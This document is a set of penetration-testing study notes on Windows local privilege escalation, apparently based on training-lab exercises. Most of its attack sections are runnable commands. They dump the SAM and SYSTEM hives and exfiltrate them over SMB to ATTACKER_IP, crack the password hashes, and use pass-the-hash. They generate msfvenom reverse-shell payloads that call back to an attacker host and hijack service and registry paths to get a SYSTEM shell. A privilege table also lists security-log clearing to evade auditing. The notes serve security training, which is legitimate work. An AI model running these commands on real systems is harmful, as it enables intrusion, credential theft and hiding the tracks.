# Windows Local Enumeration And Privilege Escalation


```powershell
whoami
whoami /priv
whoami /groups
hostname
systeminfo
```
# Exploitable Privileges
**You can check your own privileges with `whoami /priv`. Disabled privileges are as good as enabled ones. The only important thing is if you have the privilege on the list or not.**

### **All Exploitable Privileges (Priv2Admin)**

| **Privilege**                       | **Impact**   | **Tool**                | **Execution path**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | **Remarks**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| ----------------------------------- | ------------ | ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `SeAssignPrimaryToken`              | _**Admin**_  | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                                                                                                                                                                                            | Thank you [Aurélien Chalot](https://twitter.com/Defte_) for the update. I will try to re-phrase it to something more recipe-like soon.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `SeAudit`                           | **Threat**   | 3rd party tool          | Write events to the Security event log to fool auditing or to overwrite old events.                                                                                                                                                                                                                                                                                                                                                                                                                                      | Writing own events is possible with [`Authz Report Security Event`](https://learn.microsoft.com/en-us/windows/win32/api/authz/nf-authz-authzreportsecurityevent) API.- see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeAuditPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `SeBackup`                          | _**Admin**_  | 3rd party tool          | 1. Backup the `HKLM\\SAM` and `HKLM\\SYSTEM` registry hives2. Extract the local accounts hashes from the `SAM` database3. Pass-the-Hash as a member of the local `Administrators` groupAlternatively, can be used to read sensitive files.                                                                                                                                                                                                                                                                               | For more information, refer to the [`SeBackupPrivilege` file](https://github.com/gtworek/Priv2Admin/blob/master/SeBackupPrivilege.md).- see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeBackupPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `SeChangeNotify`                    | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Privilege held by everyone. Revoking it may make the OS (Windows Server 2019) unbootable.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `SeCreateGlobal`                    | ?            | ?                       | ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `SeCreatePagefile`                  | None         | _**Built-in commands**_ | Create hiberfil.sys, read it offline, look for sensitive data.                                                                                                                                                                                                                                                                                                                                                                                                                                                           | Requires offline access, which leads to admin rights anyway.- See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreatePagefilePrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `SeCreatePermanent`                 | ?            | ?                       | ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `SeCreateSymbolicLink`              | ?            | ?                       | ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `SeCreateToken`                     | _**Admin**_  | 3rd party tool          | Create arbitrary token including local admin rights with `NtCreateToken`.- see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeCreateTokenPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| `SeDebug`                           | _**Admin**_  | **PowerShell**          | Duplicate the `lsass.exe` token.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1).- See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `SeDelegateSession-UserImpersonate` | ?            | ?                       | ?                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Privilege name broken to make the column narrow.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| `SeEnableDelegation`                | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | The privilege is not used in the Windows OS.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `SeImpersonate`                     | _**Admin**_  | 3rd party tool          | Tools from the _Potato family_ (potato.exe, RottenPotato, RottenPotatoNG, Juicy Potato, SweetPotato, RemotePotato0), RogueWinRM, PrintSpoofer, etc.                                                                                                                                                                                                                                                                                                                                                                      | Similarly to `SeAssignPrimaryToken`, allows by design to create a process under the security context of another user (using a handle to a token of said user).Multiple tools and techniques may be used to obtain the required token.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| `SeIncreaseBasePriority`            | Availability | _**Built-in commands**_ | `start /realtime SomeCpuIntensiveApp.exe`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | May be more interesting on servers.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| `SeIncreaseQuota`                   | Availability | 3rd party tool          | Change cpu, memory, and cache limits to some values making the OS unbootable.                                                                                                                                                                                                                                                                                                                                                                                                                                            | - Quotas are not checked in the safe mode, which makes repair relatively easy.- The same privilege is used for managing registry quotas.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| `SeIncreaseWorkingSet`              | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | Privilege held by everyone. Checked when calling fine-tuning memory management functions.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| `SeLoadDriver`                      | _**Admin**_  | 3rd party tool          | 1. Load buggy kernel driver such as `szkg64.sys`2. Exploit the driver vulnerabilityAlternatively, the privilege may be used to unload security-related drivers with `fltMC` builtin command. i.e.: `fltMC sysmondrv`                                                                                                                                                                                                                                                                                                     | 1. The `szkg64` vulnerability is listed as [CVE-2018-15732](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732)2. The `szkg64` [exploit code](https://www.greyhathacker.net/?p=1025) was created by [Parvez Anwar](https://twitter.com/parvezghh)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `SeLockMemory`                      | Availability | 3rd party tool          | Starve System memory partition by moving pages.                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | PoC published by [Walied Assar (@waleedassar)](https://twitter.com/waleedassar/status/1296689615139676160)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| `SeMachineAccount`                  | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | The privilege is not used in the Windows OS.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `SeManageVolume`                    | _**Admin**_  | 3rd party tool          | 1. Enable the privilege in the token2. Create handle to \.\C: with `SYNCHRONIZE                                                                                                                                                                                                                                                                                                                                                                                                                                          | FILE_TRAVERSE`3. Send the` FSCTL_SD_GLOBAL_CHANGE `to replace` S-1-5-32-544 `with` S-1-5-32-545`4. Overwrite utilman.exe etc.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `SeProfileSingleProcess`            | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | The privilege is checked before changing (and in very limited set of commands, before querying) parameters of Prefetch, SuperFetch, and ReadyBoost. The impact may be adjusted, as the real effect is not known.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| `SeRelabel`                         | **Threat**   | 3rd party tool          | Modification of system files by a legitimate administrator                                                                                                                                                                                                                                                                                                                                                                                                                                                               | See: [MIC documentation](https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control)Integrity labels provide additional protection, on top of well-known ACLs. Two main scenarios include:- protection against attacks using exploitable applications such as browsers, PDF readers etc.- protection of OS files.`SeRelabel` present in the token will allow to use `WRITE_OWNER` access to a resource, including files and folders. Unfortunately, the token with IL less than _High_ will have SeRelabel privilege disabled, making it useless for anyone not being an admin already.See great [blog post](https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html) by [@tiraniddo](https://twitter.com/tiraniddo) for details. |
| `SeRemoteShutdown`                  | Availability | _**Built-in commands**_ | `shutdown /s /f /m \\\\server1 /d P:5:19`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | The privilege is verified when shutdown/restart request comes from the network. 127.0.0.1 scenario to be investigated.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `SeReserveProcessor`                | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | It looks like the privilege is no longer used and it appeared only in a couple of versions of winnt.h. You can see it listed i.e. in the source code published by Microsoft [here](https://code.msdn.microsoft.com/Effective-access-rights-dd5b13a8/sourcecode?fileId=58676&pathId=767997020).                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| `SeRestore`                         | _**Admin**_  | **PowerShell**          | 1. Launch PowerShell/ISE with the SeRestore privilege present.2. Enable the privilege with [Enable-SeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)).3. Rename utilman.exe to utilman.old4. Rename cmd.exe to utilman.exe5. Lock the console and press Win+U                                                                                                                                                                                                         | Attack may be detected by some AV software.Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.- see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeRestorePrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| `SeSecurity`                        | **Threat**   | _**Built-in commands**_ | - Clear Security event log: `wevtutil cl Security`- Shrink the Security log to 20MB to make events flushed soon: `wevtutil sl Security /ms:0`- Read Security event log to have knowledge about processes, access and actions of other users within the system.- Knowing what is logged to act under the radar.- Knowing what is logged to generate large number of events effectively purging old ones without leaving obvious evidence of cleaning.- Viewing and changing object SACLs (in practice: auditing settings) | See [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeSecurityPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| `SeShutdown`                        | Availability | _**Built-in commands**_ | `shutdown.exe /s /f /t 1`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | Allows to call most of NtPowerInformation() levels. To be investigated. Allows to call NtRaiseHardError() causing immediate BSOD and memory dump, leading potentially to sensitive information disclosure - see [PoC](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeShutdownPrivilegePoC) by [@daem0nc0re](https://twitter.com/daem0nc0re)                                                                                                                                                                                                                                                                                                                                                                                                |
| `SeSyncAgent`                       | None         | -                       | -                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        | The privilege is not used in the Windows OS.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| `SeSystemEnvironment`               | _Unknown_    | 3rd party tool          | The privilege permits to use `NtSetSystemEnvironmentValue`, `NtModifyDriverEntry` and some other syscalls to manipulate UEFI variables.                                                                                                                                                                                                                                                                                                                                                                                  | The privilege is required to run sysprep.exe.Additionally:                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |



# SeBackup - SeRestore
The SeBackup and SeRestore privileges enable users to read and write to any file in the system, disregarding any DACLs in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

```jsx
C:\\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

To backup the SAM and SYSTEM hashes, we can use the following commands:

```jsx
c:\\> reg save hklm\system c:\Users\suraj\system.hive
c:\\> re save hklm\sam c:\Users\suraj\sam.hive
```

We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox:

```jsx
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

```jsx
C:\\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket [[secretsdump.py]] to retrieve the users' password hashes:

```jsx
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**We also can use: [[creddump7]]**

```
git clone https://github.com/Tib3rius/creddump7   
pip3 install pycrypto   
python3 creddump7/pwdump.py SYSTEM SAM
```

We can finally use the Administrator's hash to perform a **`Pass-the-Hash`** attack using [[psexec.py]] and gain access to the target machine with SYSTEM privileges:

```jsx
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.98.24
```

We can use this hashes to login using [[pth-winexe]] as well:

```
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe
```

**Crack the admin NTLM hash using hashcat (If needed):**

```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

### 1. Token Privileges

Check early:

```powershell
whoami /priv
```

If privileges such as `SeImpersonatePrivilege` are present, they may provide the shortest path to elevation depending on host version and tooling constraints.

### 2. Local Groups And User Context

```powershell
net user
net localgroup administrators
```

Ask:

- is the current user already an admin with UAC restrictions?
- are there local admin accounts worth targeting through credential discovery?

### 3. Services

Services are one of the most common local privesc paths.

```powershell
sc query
sc qc <service>
```

Check for:

- services running as `LocalSystem`
- writable service binaries
- writable service directories
- unquoted service paths
- weak service permissions allowing reconfiguration

### 4. Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

Look for:

- tasks running as `SYSTEM`
- writable scripts or binaries called by those tasks
- task actions stored in user-writable locations

### 5. AlwaysInstallElevated

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

If these are set, you can generate a malicious .msi file using `msfvenom`, as seen below

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

```jsx
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```


### 6. Writable Files And Directories

```powershell
icacls "C:\Program Files"
```

You are looking for:

- modify or full control rights for low-priv users
- application directories used by privileged services
- startup paths or maintenance scripts you can influence

### 7. Stored Credentials

```powershell
cmdkey /list
reg query HKLM /f password /t REG_SZ /s
dir /s *pass*
dir /s *.config
```

Check for:

- saved credentials
- plaintext passwords in config files
- service account secrets
- deployment scripts

Switching to another account is often faster than exploiting the current one.

### 8. Unquoted Service Paths

If a service path contains spaces and is not quoted, Windows may attempt to execute a higher-level path component first.

Example:

```text
C:\Program Files\Some Service\service.exe
```

This only matters if a path component is writable by your user.

### 9. Patch And Version Context

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

Use this to understand the system, not as an excuse to jump straight to kernel exploits.

### 10. UAC And Admin-But-Filtered Scenarios

If the user is in the Administrators group but lacks a high-integrity token, think in terms of:

- UAC restrictions
- privileged scheduled tasks
- saved admin credentials

### 11. DLL Hijacking
 
 A DLL (Dynamic Link Library) is a library that contains code and data that can be used by more than one program at the same time. Essentially, DLLs are a set of instructions that exist outside of the code in an executable but are required for the executable to work.

The way that Windows loads DLLs then, is to search the following directories in this order (That is the **default** search order with **SafeDllSearchMode**):
– The directory from which the application loaded  
– C:\Windows\System32  
– C:\Windows\System  
– C:\Windows  
– The current working directory  
– Directories in the system PATH environment variable  
– Directories in the user PATH environment variable
 
It abuses how Windows loads DLLs when EXEs are executed and how default folder permissions work on Windows. By default on Windows systems an authenticated user may add a file into a directory that they don’t own, but cannot overwrite or delete existing files. This means that if, for example, an Administrator has deployed a piece of software across a network either through deploying it to the local machine and setting up an autorun or by installing the software to a share and getting users to execute the software from that share then a [threat actor](https://akimbocore.com/article/what-does-threat-actor-mean/) can cause a malicious DLL to be loaded when the software executes and this allows for arbitrary code execute at the privilege level of the executing user. Perfect for privilege escalation.

There are many forms of DLL hijacking, such as:

1. **DLL Replacement**: Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
2. **DLL Search Order Hijacking**: Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
3. **Phantom DLL Hijacking**: Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
4. **DLL Redirection**: Modifying search parameters like `%PATH%` or `.exe.manifest` / `.exe.local` files to direct the application to the malicious DLL.
5. **WinSxS DLL Replacement**: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
6. **Relative Path DLL Hijacking**: Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.

**Requirements**:
- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

# Insecure Service Executables
If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

```jsx
C:\\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\PROGRA~2\\SYSTEM~1\\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\\svcuser1
```

```jsx
C:\\Users\\thm-unpriv>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe
C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\\SYSTEM:(I)(F)
                                  BUILTIN\\Administrators:(I)(F)
                                  BUILTIN\\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
```

> The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

# Insecure Service Permissions
<aside> 💡

If the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

</aside>

[+] PowerShell command you can use to see the executable path for all _running_ services.
This is the most efficient one-liner, as it filters at the source (WMI) before creating objects in PowerShell:

```tsx
Get-CimInstance -ClassName Win32_Service -Filter "State='Running'" | Select-Object Name, DisplayName, PathName, ProcessId | Format-Table -AutoSize
```


> **To check for a service DACL from the command line, you can use [[accesschk.exe]] from the Sysinternals suite.**


```jsx
Get-Service | Where-Object {$_.Status -eq 'Running'}

C:\\tools\\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users
        SERVICE_ALL_ACCESS
```

Here we can see that the `BUILTIN\\\\Users` group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.


Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
```

Remember to grant permissions to Everyone to execute your payload:

```jsx
icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:F
```

**To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):**

```jsx
sc config THMService binPath= "C:\\Users\\thm-unpriv\\rev-svc3.exe" obj= LocalSystem
```

**Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:**

```jsx
C:\\> sc stop THMService
C:\\> sc start THMService
```

```jsx
nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM
```

# Registry - AutoRuns
Query the registry for AutoRun executables:

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

Using accesscheck.exe note that one of the AutoRun executables is writable by everyone:

```
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program"
```

Replace this exe file with revshell and restart the victime machine.


# Scheduled Tasks
Scheduled tasks can be listed from the command line using the `schtasks` command without any options. Looking into scheduled tasks on the target system, you may see a scheduled task that either lost its binary or it's using a binary you can modify.

To retrieve detailed information about any of the services, you can use a command like the following one:

```jsx
schtask
schtasks /query /tn "vulntask name" /fo list /v
```

If our current user can modify or overwrite the "Task to Run" executable, we can control what gets executed by the taskusr1 user, resulting in a simple privilege escalation. To check the file permissions on the executable, we use `icacls`

```jsx
icacls c:\\tasks\\schtask.bat
c:\\tasks\\schtask.bat NT AUTHORITY\\SYSTEM:(I)(F)
                    BUILTIN\\Administrators:(I)(F)
                    BUILTIN\\Users:(I)(F)
```

We can run the task with the following command

```jsx
schtasks /run /tn vulntask
```
# Windows Services
### **Basics**

<aside> 💡

Windows services are managed by the **`Service Control Manager (SCM).`** The SCM is a process responsible for managing the state of services as needed, checking the current status of any given service, and generally providing a way to configure services.

</aside>

Each service on a Windows machine will have an associated executable which will be run by the **`SCM`** whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the **`SCM`**, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

# List services:

```jsx
Get-Service 
# or
Get-Service | Where-Object { $_.Status -eq 'Running' }
# or
tasklist
# or
wmic service get name,startname
```

Use accesscheck.exe to check the user’s account’s permission on a service:

```jsx
C:\\PrivEsc\\accesschk.exe /accepteula -uwcqv user daclsvc
```

check the service configuration with the [[sc.exe]] command in **CMD.exe**

```jsx
c:> sc.exe qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem
```

```jsx
icacls C:\Windows\system32\svchost.exe
```



All of the services configurations are stored on the registry under `HKLM\\SYSTEM\\CurrentControlSet\\Services\\`:

A subkey exists for every service in the system. Again, we can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value. If a DACL has been configured for the service, it will be stored in a subkey called **Security**.

# TeamViewer Service
Having gained a foothold, we can now enumerate the host. Checking for running services reveals the TeamViewer service.
The service description reports that this is TeamViewer 7. We can confirm this using PowerShell.

```
Get-Command "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe"
```

# Unquoted Service Paths
<aside> 💡

By unquoted, it means that the path of the associated executable isn't properly quoted to account for spaces on the command.

</aside>

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by `"C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe"`, followed by the given parameters:

```jsx
C:\\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\\Program Files\\RealVNC\\VNC Server\\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSyste
```

<aside> 💡

**Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.**

</aside>

Now let's look at another service without proper quotation:

```jsx
C:\\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\\svcusr2
```

> Here are possibilities for SCM about unquoted **`BINARY_PATH_NAME` C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe**

|Command|Argument 1|Argument 2|
|---|---|---|
|C:\MyPrograms\Disk.exe|Sorter|Enterprise\bin\disksrs.exe|
|C:\MyPrograms\Disk Sorter.exe|Enterprise\bin\disksrs.exe||
|C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe|||

1. First, search for `C:\\\\MyPrograms\\\\Disk.exe`. If it exists, the service will run this executable.
2. If the latter doesn't exist, it will then search for `C:\\\\MyPrograms\\\\Disk Sorter.exe`. If it exists, the service will run this executable.
3. If the latter doesn't exist, it will then search for `C:\\\\MyPrograms\\\\Disk Sorter Enterprise\\\\bin\\\\disksrs.exe`. This option is expected to succeed and will typically be run in a default installation.

```jsx
C:\\>icacls c:\\MyPrograms
c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\\Administrators:(I)(OI)(CI)(F)
              BUILTIN\\Users:(I)(OI)(CI)(RX)
              BUILTIN\\Users:(I)(CI)(AD)
              BUILTIN\\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

The `BUILTIN\\\\Users` group has **AD** and **WD** privileges, allowing the user to create subdirectories and files, respectively.

creating an exe-service payload:

```jsx
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
nc -lvp 4446
```

# Vulnerable software
The command below will dump information it can gather on installed software:

```jsx
wmic product get name,version,vendor
```
# Weak Registry Permissions
**All Windows services are stored in the Registry under:**
```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

**You can verify this in CMD with:**
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

**Or even to see the image path value (the executable):**
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName> /v ImagePath
```

**If you want to enumerate many services and spot misconfigurations:**
```
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
```
#### Example:
Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).

```cmd
sc qc regsvc
```

Using accesschk.exe, note that the registry entry for the regsvc service is writable by the group  (essentially all logged-on users):

`C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc`

Overwrite the ImagePath registry key to point to the reverse.exe executable you created:

`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`

Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:

`net start regsvc`

# DPAPI abuse
